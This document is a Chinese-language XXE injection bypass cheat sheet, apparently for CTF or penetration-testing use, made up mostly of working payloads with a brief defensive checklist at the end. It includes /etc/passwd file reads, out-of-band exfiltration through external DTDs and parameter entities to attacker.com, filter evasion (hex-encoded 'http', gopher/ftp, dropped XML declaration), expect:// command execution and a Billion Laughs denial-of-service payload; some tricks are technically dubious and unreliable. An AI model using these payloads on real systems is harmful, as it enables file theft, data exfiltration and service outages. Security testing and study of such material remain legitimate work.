# XXE(XML外部实体)注入绕过秘笈

## 基础XXE利用

### 文件读取
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
    <data>&xxe;</data>
</root>

<!-- 服务器返回response时会显示/etc/passwd内容 -->
```

### 外部DTD加载
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo SYSTEM "https://attacker.com/evil.dtd">
<root>
    <data>test</data>
</root>

<!-- evil.dtd中定义恶意实体 -->
```

## Out-of-Band (OOB)数据提取

### DNS外带通道
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY oob "http://attacker.com/?data=&xxe;">
]>
<root>
    <ref>&oob;</ref>
</root>

<!-- 服务器会向attacker.com发起请求，URL中包含/etc/passwd -->
```

### HTTP外带通道
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % param "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%xxe;'>">
  %param;
  %exfiltrate;
]>
<root/>

<!-- 参数实体嵌套实现数据外带 -->
```

## 编码和格式绕过

### 不同编码测试
```xml
<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- 某些XML解析器对不同编码处理不同 -->
```

### 特殊字符编码
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd%00">]>
<root>&xxe;</root>

<!-- 使用URL编码和NULL字节 -->
```

## SOAP和WebService XXE

### SOAP中的XXE
```xml
<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <![CDATA[
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <data>&xxe;</data>
    ]]>
  </soap:Body>
</soap:Envelope>
```

### WSDL导入XXE
```xml
<!-- WSDL导入外部文件 -->
<import namespace="http://test" location="https://attacker.com/evil.wsdl"/>
```

## 错误信息泄露

### 基于错误的XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

<!-- 如果文件内容无法解析，错误信息会包含文件内容 -->
```

### Invalid字符导致错误信息泄露
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>
  &xxe;
</foo>

<!-- 某些XML库会在错误信息中打印&xxe;的值 -->
```

## XXE过滤绕过

### HTML实体混淆
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&amp;xxe;</foo>

<!-- &amp;xxe; 在HTML中显示为 &xxe;
     某些过滤器可能被混淆 -->
```

### 注释和空白
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!-- comment -->
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

<!-- 在DTD中添加注释 -->
```

## 协议利用

### 本地协议
```xml
<!-- file:// -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">

<!-- expect:// (某些PHP系统) -->
<!ENTITY xxe SYSTEM "expect://id">

<!-- php://filter -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">

<!-- 访问支持的所有协议 -->
```

## 复杂的参数实体链

### 递归参数实体
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>

<!-- 亿级实体膨胀(Billion Laughs) - 拒绝服务 -->
```

## 嵌套DTD参数实体注入技术

### 嵌套DTD参数实体注入详解
```xml
<!-- 在无回显或输出受限的场景下，需要使用嵌套DTD技术通过外部服务器带出数据 -->
<!-- 绕过原理：使用参数实体（%entity）在DTD中定义嵌套实体 -->
<!-- 通过外部DTD文件实现参数实体的二次定义 -->

<!-- 利用方法： -->
<!-- 1. 创建外部DTD文件（evil.dtd） -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfiltrate;

<!-- 2. 在payload中引用外部DTD -->
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd">
<foo>&exfiltrate;</foo>

<!-- 3. 通过HTTP请求将文件内容带出 -->
<!-- 攻击者服务器会收到包含/etc/passwd内容的HTTP请求 -->
```

### php://filter协议在XXE中的应用
```xml
<!-- 使用php://filter读取文件并Base64编码 -->
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<root>&xxe;</root>

<!-- 这样可以避免特殊字符导致XML解析错误 -->
```

## XML结构识别和适配

### 不同接口的XML结构识别
```xml
<!-- 根据代码逻辑识别正确的XML结构 -->
<!-- 识别方法： -->
<!-- 1. 检查代码中是否有特定的节点访问 -->
<!-- 2. 分析接口的业务逻辑 -->
<!-- 3. 确定期望的XML结构 -->

<!-- 利用方法： -->
<!-- 根据代码中的节点访问确定XML结构 -->
<!-- 对于登录接口，通常需要username和password字段 -->

<!-- 示例： -->
<!-- 代码：$username = $xml->username; -->
<!-- 正确的XML结构： -->
<root>
    <username>admin</username>
    <password>123456</password>
</root>

<!-- 接口路径识别： -->
<!-- 不同题目可能使用不同的接口路径，需要识别正确的访问路径 -->
<!-- 例如：/api/login、/login.php、/user/login等 -->
```

## http关键字过滤的绕过

### http过滤的绕过方法详解
```xml
<!-- 方法1：使用IP地址替代域名 -->
<!ENTITY xxe SYSTEM "http://192.168.1.1/evil.dtd">

<!-- 方法2：使用十六进制编码 -->
<!ENTITY xxe SYSTEM "&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;attacker.com/evil.dtd">
<!-- 十六进制：68 74 74 70 = http -->

<!-- 方法3：检查是否可以使用其他协议 -->
<!ENTITY xxe SYSTEM "ftp://attacker.com/evil.dtd">
<!ENTITY xxe SYSTEM "gopher://attacker.com/evil.dtd">

<!-- 利用条件： -->
<!-- - 需要知道攻击服务器的IP地址 -->
<!-- - XML解析器需要支持相应的编码方式 -->

<!-- 其他间接绕过技术： -->
<!-- - UTF-16编码 -->
<!-- - 实体引用 -->
```

## XML声明过滤的绕过

### 绕过原理
```xml
<!-- XML声明在XML规范中是可选的 -->
<!-- DOMDocument::loadXML()可以解析没有声明的XML文档 -->

<!-- 利用方法： -->
<!-- 直接去掉XML声明：<?xml version="1.0"?> -->
<!-- 保持DOCTYPE和ENTITY定义不变 -->

<!-- 示例： -->
<!-- 原始（被过滤）： -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

<!-- 绕过（去掉XML声明）： -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

<!-- 利用步骤： -->
<!-- 1. 检查过滤规则是否只检测XML声明 -->
<!-- 2. 构造不包含XML声明的payload -->
<!-- 3. 保持其他部分不变 -->
```

## 快速定位和利用

**关键词识别**：
- XML处理接收用户输入
- 未禁用外部实体
- 接受DTD
- SOAP/WebService
- 文件上传（SVG、XML等）
- http关键字过滤
- XML声明过滤

**测试优先级**：
1. 基础XXE测试（file://读取）
2. 错误消息XXE
3. OOB数据提取（嵌套DTD参数实体注入）
4. 协议枚举
5. 参数实体链和DoS
6. XML结构识别和适配
7. http关键字过滤绕过
8. XML声明过滤绕过

## 防御检查清单

- ✓ 完全禁用DTD处理
- ✓ 禁用外部实体（DOCTYPE、ENTITY）
- ✓ 禁用参数实体
- ✓ 仅允许特定的XML元素和属性
- ✓ 使用现代XML库并保持更新
- ✓ 验证XML结构和内容
- ✓ 实施文件大小限制（防DoS）
- ✓ 禁用危险的XML功能：
  - Feature 'http://xml.org/sax/features/external-general-entities'
  - Feature 'http://xml.org/sax/features/external-parameter-entities'
  - Feature 'http://apache.org/xml/features/nonvalidating/load-external-dtd'
